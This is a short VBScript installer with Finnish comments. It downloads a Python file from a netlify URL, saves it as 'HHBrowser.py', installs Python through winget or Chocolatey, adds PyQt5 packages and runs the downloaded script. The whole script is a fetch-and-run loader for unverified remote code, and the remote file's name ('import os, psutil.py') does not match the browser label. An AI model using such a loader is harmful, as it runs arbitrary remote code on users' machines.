Option Explicit
MsgBox "installing skibidi"
Dim http, fileSystem, fileStream, url, fileName, shell, cmd, pythonInstalled

' URL Python-tiedostoon
url = "https://64bytes.netlify.app/import os, psutil.py" ' Vaihda tämä haluamaasi URL-osoitteeseen

' Paikallinen tiedostonimi
fileName = "HHBrowser.py"

' Luo XMLHTTP-objekti tiedoston lataamiseen
Set http = CreateObject("MSXML2.ServerXMLHTTP.6.0")
http.Open "GET", url, False
http.send

' Luo FileSystem-objekti tiedoston tallentamiseen
Set fileSystem = CreateObject("Scripting.FileSystemObject")
Set fileStream = fileSystem.CreateTextFile(fileName, True)

' Kirjoita ladattu sisältö tiedostoon
fileStream.Write http.responseText
fileStream.Close

' Siivoa
Set http = Nothing
Set fileSystem = Nothing
Set fileStream = Nothing

MsgBox "HHBrowser installed. Filename: " & fileName

' Komentorivillä suoritettavat komennot
Set shell = CreateObject("WScript.Shell")

' Tarkista, onko Python asennettu
pythonInstalled = False
On Error Resume Next
shell.Run "cmd /c python --version", 0, True
If Err.Number = 0 Then
    pythonInstalled = True
End If
On Error GoTo 0

If Not pythonInstalled Then
    ' Asenna Python, jos se ei ole asennettuna
    MsgBox "Python ei ole asennettu. Asennetaan Python..."

    ' Tarkista, onko winget saatavilla
    On Error Resume Next
    shell.Run "cmd /c winget --version", 0, True
    If Err.Number = 0 Then
        ' Asenna Python käyttäen winget
        cmd = "cmd /c winget install --id Python.Python.3 --source winget"
        shell.Run cmd, 1, True
    Else
        ' Winget ei ole saatavilla, kokeile Chocolatey
        MsgBox "Winget ei ole saatavilla. Tarkista Chocolatey-asennus."

        On Error Resume Next
        shell.Run "cmd /c choco --version", 0, True
        If Err.Number = 0 Then
            ' Asenna Python käyttäen Chocolatey
            cmd = "cmd /c choco install python --version=3.9.7"
            shell.Run cmd, 1, True
        Else
            MsgBox "Chocolatey ei ole saatavilla. Asenna Python manuaalisesti."
        End If
        On Error GoTo 0
    End If
    On Error GoTo 0

    MsgBox "Python asennettu tai asennus yritettiin."
Else
    MsgBox "Python on jo asennettu."
End If

' Pip-komennot - Lisää tarvittavat paketit tähän
cmd = "cmd /c pip install PyQt5 PyQtWebEngine"
shell.Run cmd, 0, True

MsgBox "Paketit asennettu onnistuneesti."

' Käynnistä Python-skripti
cmd = "cmd /c python " & fileName
shell.Run cmd, 1, True
